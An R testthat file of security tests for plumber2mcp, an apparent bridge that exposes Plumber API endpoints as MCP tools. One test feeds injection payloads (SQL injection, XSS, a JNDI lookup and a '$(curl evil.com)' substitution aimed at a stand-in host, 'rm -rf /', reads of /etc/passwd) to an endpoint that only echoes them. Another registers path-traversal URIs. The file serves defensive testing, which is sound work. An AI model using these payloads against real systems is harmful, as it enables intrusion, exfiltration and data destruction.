# Security and validation tests

test_that("validates router object strictly", {
  # Various non-router objects
  expect_error(pr_mcp(NULL, transport = "http"), "Input must be a Plumber router")
  expect_error(pr_mcp(list(), transport = "http"), "Input must be a Plumber router")
  expect_error(pr_mcp("string", transport = "http"), "Input must be a Plumber router")
  expect_error(pr_mcp(42, transport = "http"), "Input must be a Plumber router")
  expect_error(pr_mcp(data.frame(), transport = "http"), "Input must be a Plumber router")

  # Valid router should not error
  pr <- plumber::pr()
  expect_silent(pr_mcp(pr, transport = "http"))
})

test_that("prevents injection in tool names", {
  pr <- plumber::pr()

  # Paths with special characters
  pr$handle("GET", "/test/../admin", function() "test")
  pr$handle("GET", "/test;drop table", function() "test")

  tools <- plumber2mcp:::extract_plumber_tools(pr, NULL, NULL)

  # Tool names should be sanitized or at least not cause issues
  expect_true(length(tools) > 0)

  for (tool in tools) {
    # Tool names should be strings
    expect_true(is.character(tool$name))
    expect_true(nchar(tool$name) > 0)
  }
})

test_that("handles potentially malicious parameter names", {
  pr <- plumber::pr()

  # Function with unusual parameter names
  test_func <- function(`__proto__`, `constructor`, `eval`) {
    list(
      proto = `__proto__`,
      constructor = `constructor`,
      eval = `eval`
    )
  }

  pr$handle("POST", "/test", test_func)

  endpoint <- pr$endpoints[[1]][[1]]
  schema <- plumber2mcp:::create_input_schema(endpoint)

  # Should handle without errors
  expect_true("__proto__" %in% names(schema$properties) ||
              "constructor" %in% names(schema$properties) ||
              "eval" %in% names(schema$properties))
})

test_that("prevents excessively long strings in schemas", {
  pr <- plumber::pr()

  # Create endpoint with very long description
  pr$handle("GET", "/test", function() "test")
  endpoint <- pr$endpoints[[1]][[1]]

  # Mock very long comment
  endpoint$comments <- paste(rep("x", 10000), collapse = "")
  endpoint$description <- paste(rep("y", 10000), collapse = "")

  # Should not crash
  desc <- plumber2mcp:::create_enhanced_description(endpoint, "GET", "/test")
  expect_true(is.character(desc))
})

test_that("handles circular references safely", {
  pr <- plumber::pr()

  # Create circular reference
  circular_list <- list(a = 1)
  circular_list$self <- circular_list

  pr$handle("POST", "/circular", function() circular_list)

  tools <- plumber2mcp:::extract_plumber_tools(pr, NULL, NULL)

  # Calling the tool might error, but shouldn't crash R
  expect_true(length(tools) > 0)

  # Attempting to call should be handled gracefully
  response <- plumber2mcp:::handle_tools_call(
    list(
      jsonrpc = "2.0",
      id = 1,
      params = list(name = "POST__circular", arguments = list())
    ),
    tools,
    pr
  )

  # Should either succeed or return proper error
  expect_true("result" %in% names(response) || "error" %in% names(response))
})

test_that("validates prompt function is actually a function", {
  pr <- plumber::pr()
  pr <- pr_mcp_http(pr)

  # Can add prompt with non-function (validation happens at call time)
  # But calling it should error
  pr <- pr_mcp_prompt(pr, "test1", "Test", func = "not a function")
  expect_true("test1" %in% names(pr$environment$mcp_prompts))

  # Attempting to get this prompt should error
  response <- plumber2mcp:::handle_prompts_get(
    list(jsonrpc = "2.0", id = 1, params = list(name = "test1")),
    pr
  )
  expect_true("error" %in% names(response))

  # Same for NULL and numeric
  pr <- pr_mcp_prompt(pr, "test2", "Test", func = NULL)
  response <- plumber2mcp:::handle_prompts_get(
    list(jsonrpc = "2.0", id = 2, params = list(name = "test2")),
    pr
  )
  expect_true("error" %in% names(response))

  pr <- pr_mcp_prompt(pr, "test3", "Test", func = 42)
  response <- plumber2mcp:::handle_prompts_get(
    list(jsonrpc = "2.0", id = 3, params = list(name = "test3")),
    pr
  )
  expect_true("error" %in% names(response))
})

test_that("validates resource function is actually a function", {
  pr <- plumber::pr()

  # Can add resource with non-function (validation happens at call time)
  pr <- pr_mcp_resource(pr, "/test", func = "not a function", name = "Test")
  expect_true("/test" %in% names(pr$environment$mcp_resources))

  # Attempting to read this resource should error
  response <- plumber2mcp:::handle_resources_read(
    list(jsonrpc = "2.0", id = 1, params = list(uri = "/test")),
    pr
  )
  expect_true("error" %in% names(response))
})

test_that("handles function code with potential script injection", {
  pr <- plumber::pr()

  # Function with code that looks like injection
  pr$handle("POST", "/test", function(user_input) {
    # Don't actually eval! Just return safely
    list(safe_output = paste("Input was:", user_input))
  })

  tools <- plumber2mcp:::extract_plumber_tools(pr, NULL, NULL)

  # Try calling with injection-like input
  malicious_inputs <- list(
    "'; DROP TABLE users;--",
    "<script>alert('xss')</script>",
    "${jndi:ldap://evil.com/a}",
    "../../etc/passwd",
    "`rm -rf /`",
    "$(curl evil.com)",
    "'; system('cat /etc/passwd'); --"
  )

  for (input in malicious_inputs) {
    response <- plumber2mcp:::handle_tools_call(
      list(
        jsonrpc = "2.0",
        id = 1,
        params = list(
          name = "POST__test",
          arguments = list(user_input = input)
        )
      ),
      tools,
      pr
    )

    # Should handle safely
    expect_true("result" %in% names(response) || "error" %in% names(response))

    if ("result" %in% names(response)) {
      result_data <- jsonlite::fromJSON(response$result$content[[1]]$text)
      # Input should be returned safely, not executed
      expect_true(grepl("Input was:", result_data$safe_output))
    }
  }
})

test_that("enforces reasonable limits on resource count", {
  pr <- plumber::pr()
  pr <- pr_mcp_http(pr)

  # Add many resources
  for (i in 1:100) {
    pr <- pr_mcp_resource(
      pr,
      uri = paste0("/resource", i),
      func = function() "content",
      name = paste("Resource", i)
    )
  }

  # Should still work (no hard limit, but shouldn't crash)
  expect_equal(length(pr$environment$mcp_resources), 100)

  handler <- plumber2mcp:::create_mcp_handler(pr, NULL, NULL, "test", "1.0")

  response <- handler$handle_message(
    list(body = list(jsonrpc = "2.0", id = 1, method = "resources/list")),
    list()
  )

  expect_equal(length(response$result$resources), 100)
})

test_that("enforces reasonable limits on prompt count", {
  pr <- plumber::pr()
  pr <- pr_mcp_http(pr)

  # Add many prompts
  for (i in 1:100) {
    pr <- pr_mcp_prompt(
      pr,
      name = paste0("prompt", i),
      description = paste("Prompt", i),
      func = function() paste("Message", i)
    )
  }

  # Should still work
  expect_equal(length(pr$environment$mcp_prompts), 100)

  handler <- plumber2mcp:::create_mcp_handler(pr, NULL, NULL, "test", "1.0")

  response <- handler$handle_message(
    list(body = list(jsonrpc = "2.0", id = 1, method = "prompts/list")),
    list()
  )

  expect_equal(length(response$result$prompts), 100)
})

test_that("handles binary data safely", {
  pr <- plumber::pr()

  # Function that might receive binary-like data
  pr$handle("POST", "/binary", function(data) {
    list(
      received_length = nchar(as.character(data)),
      type = class(data)
    )
  })

  tools <- plumber2mcp:::extract_plumber_tools(pr, NULL, NULL)

  # Send base64-encoded data
  binary_like <- "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="

  response <- plumber2mcp:::handle_tools_call(
    list(
      jsonrpc = "2.0",
      id = 1,
      params = list(
        name = "POST__binary",
        arguments = list(data = binary_like)
      )
    ),
    tools,
    pr
  )

  expect_true("result" %in% names(response) || "error" %in% names(response))
})

test_that("validates JSON-RPC id field types", {
  pr <- plumber::pr()
  pr$handle("GET", "/test", function() "ok")

  handler <- plumber2mcp:::create_mcp_handler(pr, NULL, NULL, "test", "1.0")

  # Valid id types: string, number, or null
  valid_ids <- list(
    1,
    "string-id",
    NULL,
    42.5
  )

  for (id in valid_ids) {
    response <- handler$handle_message(
      list(body = list(
        jsonrpc = "2.0",
        id = id,
        method = "tools/list"
      )),
      list()
    )

    expect_equal(response$id, id)
  }
})

test_that("prevents path traversal in resource URIs", {
  pr <- plumber::pr()

  # URIs that look like path traversal
  dangerous_uris <- c(
    "/../../../etc/passwd",
    "/resource/../../admin",
    "/test/../../../secret"
  )

  for (uri in dangerous_uris) {
    # Should be able to add (URI is just a string identifier in MCP)
    pr <- pr_mcp_resource(
      pr,
      uri = uri,
      func = function() "content",
      name = "Test"
    )
  }

  # URIs are stored as-is (they're logical identifiers, not file paths)
  expect_equal(length(pr$environment$mcp_resources), length(dangerous_uris))
})

test_that("handles extremely nested function calls safely", {
  pr <- plumber::pr()

  # Deeply nested function
  deeply_nested <- function() {
    list(
      a = list(
        b = list(
          c = list(
            d = list(
              e = list(
                f = list(
                  g = list(
                    h = list(
                      i = list(
                        j = "deep"
                      )
                    )
                  )
                )
              )
            )
          )
        )
      )
    )
  }

  pr$handle("GET", "/deep", deeply_nested)

  # Should not crash when extracting schema
  tools <- plumber2mcp:::extract_plumber_tools(pr, NULL, NULL)
  expect_true(length(tools) > 0)

  # Should handle output schema gracefully
  tool <- tools[[1]]
  expect_true("outputSchema" %in% names(tool))
})

test_that("handles functions with many parameters", {
  pr <- plumber::pr()

  # Function with many parameters
  many_params <- function(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10,
                          p11, p12, p13, p14, p15, p16, p17, p18, p19, p20) {
    list(count = 20)
  }

  pr$handle("POST", "/many", many_params)

  endpoint <- pr$endpoints[[1]][[1]]
  schema <- plumber2mcp:::create_input_schema(endpoint)

  # Should handle all parameters
  expect_equal(length(schema$properties), 20)
  expect_equal(length(schema$required), 20)
})

test_that("prevents stack overflow in schema generation", {
  pr <- plumber::pr()

  # Function that returns self-referencing structure
  pr$handle("GET", "/recursive", function() {
    x <- list(value = 1)
    # Don't actually make it circular in test
    list(data = x)
  })

  # Should not crash
  tools <- plumber2mcp:::extract_plumber_tools(pr, NULL, NULL)
  expect_true(length(tools) > 0)

  tool <- tools[[1]]
  expect_true("outputSchema" %in% names(tool))
})
